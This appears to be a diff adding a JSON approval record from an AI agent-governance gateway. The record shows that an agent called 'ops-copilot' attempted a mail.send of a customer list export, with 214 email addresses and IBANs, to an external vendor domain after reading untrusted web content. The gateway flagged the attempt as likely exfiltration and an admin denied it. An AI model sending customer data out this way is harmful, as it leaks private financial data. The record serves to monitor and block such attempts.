@@ -1,0 +1,35 @@
+{
+  "approval": {
+    "id": "apr_7f3c",
+    "status": "denied",
+    "created_at": "2026-10-04T02:41:16.077Z",
+    "expires_at": "2026-10-04T05:37:12.000Z",
+    "trace_id": "tr_01K657P3Y3QJHBWAEQCFAD4G3D",
+    "principal": {
+      "id": "ops-copilot",
+      "team": "operations"
+    },
+    "session_id": "ses_c6060e1836d8",
+    "route": "openai.chat",
+    "tool": "mail.send",
+    "arguments": {
+      "to": "a***@vendor-pay.example",
+      "subject": "Customer list export",
+      "body": "[3,412 chars, contains 214 x [REDACTED:EMAIL], 214 x [REDACTED:IBAN]]"
+    },
+    "arguments_hash": "sha256:525eae9425265a11110ef3ca445c040e0f56c983dc451dbdc43026cddb465114",
+    "finding": "tool_governance.lethal_trifecta",
+    "reason": "Session read untrusted content (web.fetch) and customer data (crm.lookup_customer) and now sends mail to an external domain. T2: P(misaligned)=0.74, P(exfiltration)=0.94.",
+    "owasp_llm": [
+      "LLM06",
+      "LLM02"
+    ],
+    "owasp_agentic": [
+      "ASI01",
+      "ASI02"
+    ],
+    "decided_at": "2026-10-04T05:30:00.000Z",
+    "decided_by": "admin",
+    "note": "External recipient, customer list export."
+  }
+}
